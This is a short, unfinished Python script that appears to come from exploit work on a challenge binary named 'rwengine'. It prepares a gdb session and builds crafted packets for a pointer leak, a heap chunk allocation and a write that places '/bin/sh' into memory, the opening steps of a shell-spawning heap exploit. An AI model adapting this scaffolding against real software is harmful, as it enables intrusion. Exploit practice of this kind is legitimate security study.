import subprocess

# Run gdb on rwengine with script
gdb_cmd = """
file ./rwengine
set environment LD_LIBRARY_PATH .
run < input.bin
backtrace
info registers
"""

# Let's create input.bin using python
import struct

page_ptr_leak_pkt = struct.pack(">BH", 0x10, 200) + b" " * 200
chunk0_alloc_pkt  = struct.pack(">BH", 0x12, 2) + struct.pack(">H", 0x100)
chunk0_write_pkt  = struct.pack(">BH", 0x14, 10) + struct.pack(">H", 0) + b"/bin/sh\x00"
cleanup_add_pkt   = struct.pack(">BH", 0x15, 0)
# We will generate input.bin dynamically in python script
